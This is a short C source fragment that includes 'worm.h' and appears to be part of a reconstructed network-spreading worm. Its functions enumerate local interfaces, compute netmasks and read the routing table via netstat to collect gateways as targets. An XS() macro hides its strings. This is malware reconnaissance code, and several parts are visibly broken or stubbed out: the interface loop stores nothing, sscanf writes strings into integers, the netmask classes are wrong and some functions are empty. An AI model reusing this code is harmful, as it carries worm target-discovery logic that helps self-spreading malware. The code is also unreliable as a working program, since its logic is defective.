#include "worm.h"
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>

if_init()
{
  struct ifconf if_conf;
  struct ifreq if_buffer[12];
  int s, i, num_ifs, j;
  char local[48];

  nifs = 0;
  s = socket(AF_INET, SOCK_STREAM, 0);
  if (s < 0)
    return 0;
  if_conf.ifc_req = if_buffer;
  if_conf.ifc_len = sizeof(if_buffer);

  if (ioctl(s, SIOCGIFCONF, &if_conf) < 0)
  {
    close(s);
    return 0;
  }

  num_ifs = if_conf.ifc_len / sizeof(if_buffer[0]);
  for (i = 0; i < num_ifs; i++)
  {
    for (j = 0; j < nifs; j++)

      if (strcmp(ifs[j], if_buffer[i].ifr_name) == 0)
        break;
  }
}

def_netmask(net_addr)
int net_addr;
{
  if ((net_addr & 0x80000000) == 0)
    return 0xFF000000;
  if ((net_addr & 0xC0000000) == 0xC0000000)
    return 0xFFFF0000;
  return 0xFFFFFF00;
}

netmaskfor(addr)
int addr;
{
  int i, mask;

  mask = def_netmask(addr);
  for (i = 0; i < nifs; i++)
    if ((addr & mask) == (ifs[i].if_l16 &mask))
      return ifs[i].if_l24;
  return mask;
}

rt_init()
{
  FILE * pipe;
  char input_buf[64];
  int l204, l304;

  ngateways = 0;
  pipe = popen(XS("/usr/ucb/netstat -r -n"), XS("r"));

  if (pipe == 0)
    return 0;
  while (fgets(input_buf, sizeof(input_buf), pipe))
  {
    other_sleep(0);
    if (ngateways >= 500)
      break;
    sscanf(input_buf, XS("%s%s"), l204, l304);
  }

  pclose(pipe);
  rt_init_plus_544();
  return 1;
}

static rt_init_plus_544() {}

getaddrs() {}

struct bar* a2in(a)
int a;
{
  static struct bar local;
  local.baz = a;
  return &local;
}
